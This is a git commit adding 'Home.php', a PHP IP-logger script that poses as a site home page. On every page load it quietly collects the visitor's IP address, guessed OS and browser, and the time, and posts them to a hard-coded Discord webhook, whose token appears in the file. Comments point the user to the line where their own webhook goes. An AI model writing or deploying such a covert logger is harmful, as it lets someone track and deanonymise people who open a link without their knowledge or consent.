b1035c55601c76205ee05a8a729ebd611e40ee83
zakkzah7 <83830471+zakkzah7@users.noreply.github.com>
2021-05-27 16:15:30 +0200

    Add files via upload

---
+++ Home.php
@@ -0,0 +1,92 @@
+<?php
+// © COPYRIGHT 2020 - Les Batcodes - https://youtu.be/QnA2N21vrCU
+$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
+function getOS() { 
+    global $user_agent;
+    $os_platform    =   "RubMyTummy Loading...";
+    $os_array       =   array(
+                            '/windows nt 10/i'     =>  'Windows 10',
+                            '/windows nt 6.3/i'     =>  'Windows 8.1',
+                            '/windows nt 6.2/i'     =>  'Windows 8',
+                            '/windows nt 6.1/i'     =>  'Windows 7',
+                            '/windows nt 6.0/i'     =>  'Windows Vista',
+                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
+                            '/windows nt 5.1/i'     =>  'Windows XP',
+                            '/windows xp/i'         =>  'Windows XP',
+                            '/windows nt 5.0/i'     =>  'Windows 2000',
+                            '/windows me/i'         =>  'Windows ME',
+                            '/win98/i'              =>  'Windows 98',
+                            '/win95/i'              =>  'Windows 95',
+                            '/win16/i'              =>  'Windows 3.11',
+                            '/macintosh|mac os x/i' =>  'Mac OS X',
+                            '/mac_powerpc/i'        =>  'Mac OS 9',
+                            '/linux/i'              =>  'Linux',
+							'/kalilinux/i'          =>  'KaliLinux Hacker',
+                            '/ubuntu/i'             =>  'Ubuntu',
+                            '/iphone/i'             =>  'iPhone',
+                            '/ipod/i'               =>  'iPod',
+                            '/ipad/i'               =>  'iPad',
+                            '/android/i'            =>  'Android',
+                            '/blackberry/i'         =>  'BlackBerry',
+                            '/webos/i'              =>  'Mobile',
+							'/Windows Phone/i'      =>  'Windows Phone'
+                        );
+    foreach ($os_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $os_platform    =   $value;
+        }
+    }   
+    return $os_platform;
+}
+function getBrowser() {
+    global $user_agent;
+    $browser        =   "Unknown Browser";
+    $browser_array  =   array(
+                            '/msie/i'       =>  'Internet Explorer',
+                            '/firefox/i'    =>  'Firefox',
+							'/Mozilla/i'	=>	'Mozila',
+							'/Mozilla/5.0/i'=>	'Mozila',
+                            '/safari/i'     =>  'Safari',
+                            '/chrome/i'     =>  'Chrome',
+                            '/edge/i'       =>  'Edge',
+                            '/opera/i'      =>  'Opera',
+							'/OPR/i'        =>  'Opera',
+                            '/netscape/i'   =>  'Netscape',
+                            '/maxthon/i'    =>  'Maxthon',
+                            '/konqueror/i'  =>  'Konqueror',
+							'/Bot/i'		=>	'Spam',
+							'/Valve Steam GameOverlay/i'  =>  'Steam',
+                            '/mobile/i'     =>  'RubMyTummy Phone'
+                        );
+    foreach ($browser_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $browser    =   $value;
+        }
+    }
+    return $browser;
+}
+$user_os        =   getOS();
+$user_browser   =   getBrowser();
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$site_refer = $_SERVER['HTTP_REFERER'];
+	if($site_refer == ""){
+		$site = "dirrect connection";
+	}
+else{
+		$site = $site_refer;
+	}
+date_default_timezone_set('TIMEZONE');//<------------     Time Zone here      https://www.php.net/manual/en/timezones.php
+$time = date('Y-m-d H:i:s');
+$make_json = json_encode(array ('content'=>"$ip | $user_os | $user_browser | $time\n"));
+$exec = curl_init("https://discord.com/api/webhooks/847470085135663104/AQrVcf9DIUadyOjTT4Ezp1det7Y0RMHJmUduQziN5Ugnem3jQmrdBa-BHtza5HrKGDcD");         //<------------     WEBHOOK HERE                                                                               <-----------      WEBHOOK ON THIS LINE
+// © COPYRIGHT 2020 - Les Batcodes - https://youtu.be/QnA2N21vrCU
+curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+curl_setopt( $exec, CURLOPT_POST, 1);
+curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
+curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt( $exec, CURLOPT_HEADER, 0);
+curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
+$response = curl_exec( $exec );
+// © COPYRIGHT 2020 - Les Batcodes - https://youtu.be/QnA2N21vrCU
+?>
